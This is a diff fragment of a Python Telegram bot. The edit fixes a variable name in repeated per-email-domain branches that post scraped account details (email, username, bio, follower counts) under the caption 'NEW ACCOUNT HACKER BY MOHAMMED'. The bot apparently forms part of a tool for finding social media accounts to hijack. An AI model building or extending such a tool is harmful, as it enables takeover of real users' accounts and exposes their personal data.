@@ -118,7 +118,7 @@ def start(message):
 						followers = url.split('"followers" :"<li class="list__item">')[1].split('</li>"')[0]
 						following = url.split('"following" :"<li class="list__item">')[1].split('</li>"}')[0]
 						hacker =" https://t.me/z9oon/13"
-						bot.send_video(message.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,username,name,bio,post,followers,following,copyright),parse_mode = "markdown")
+						bot.send_video(message.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,user,name,bio,post,followers,following,copyright),parse_mode = "markdown")
 			elif (email.split('@')[1])=='hotmail.com':
 				email = email
 				user = user
@@ -146,7 +146,7 @@ def start(message):
 						followers = url.split('"followers" :"<li class="list__item">')[1].split('</li>"')[0]
 						following = url.split('"following" :"<li class="list__item">')[1].split('</li>"}')[0]
 						hacker =" https://t.me/z9oon/13"
-						bot.send_video(message.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,username,name,bio,post,followers,following,copyright),parse_mode = "markdown")
+						bot.send_video(message.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,user,name,bio,post,followers,following,copyright),parse_mode = "markdown")
 			elif (email.split('@')[1])=='outlook.com':
 				email = email
 				user = user
@@ -174,7 +174,7 @@ def start(message):
 						followers = url.split('"followers" :"<li class="list__item">')[1].split('</li>"')[0]
 						following = url.split('"following" :"<li class="list__item">')[1].split('</li>"}')[0]
 						hacker =" https://t.me/z9oon/13"
-						bot.send_video(message.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,username,name,bio,post,followers,following,copyright),parse_mode = "markdown")
+						bot.send_video(message.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,user,name,bio,post,followers,following,copyright),parse_mode = "markdown")
 			elif (email.split('@')[1])=='yahoo.com':
 				email = email
 				user = user
@@ -202,7 +202,7 @@ def start(message):
 						followers = url.split('"followers" :"<li class="list__item">')[1].split('</li>"')[0]
 						following = url.split('"following" :"<li class="list__item">')[1].split('</li>"}')[0]
 						hacker =" https://t.me/z9oon/13"
-						bot.send_video(message.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,username,name,bio,post,followers,following,copyright),parse_mode = "markdown")
+						bot.send_video(message.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,user,name,bio,post,followers,following,copyright),parse_mode = "markdown")
 			elif (email.split('@')[1])=='mail.ru':
 				email = email
 				user = user
@@ -228,7 +228,7 @@ def start(message):
 						followers = url.split('"followers" :"<li class="list__item">')[1].split('</li>"')[0]
 						following = url.split('"following" :"<li class="list__item">')[1].split('</li>"}')[0]
 						hacker =" https://t.me/z9oon/13"
-						bot.send_video(message.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,username,name,bio,post,followers,following,copyright),parse_mode = "markdown")
+						bot.send_video(message.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,user,name,bio,post,followers,following,copyright),parse_mode = "markdown")
 			elif (email.split('@')[1])=='aol.com':
 				email = email
 				user = user
@@ -257,7 +257,7 @@ def start(message):
 						followers = url.split('"followers" :"<li class="list__item">')[1].split('</li>"')[0]
 						following = url.split('"following" :"<li class="list__item">')[1].split('</li>"}')[0]
 						hacker =" https://t.me/z9oon/13"
-						bot.send_video(message.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,username,name,bio,post,followers,following,copyright),parse_mode = "markdown")					
+						bot.send_video(message.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,user,name,bio,post,followers,following,copyright),parse_mode = "markdown")					
 #	elif message.text == '/cinsta' or message.text == '/cinsta@CH_IG_FB_TK_SNAP_BOT':
 
 #	elif message.text == '/uinsta' or message.text == '/uinsta@CH_IG_FB_TK_SNAP_BOT':
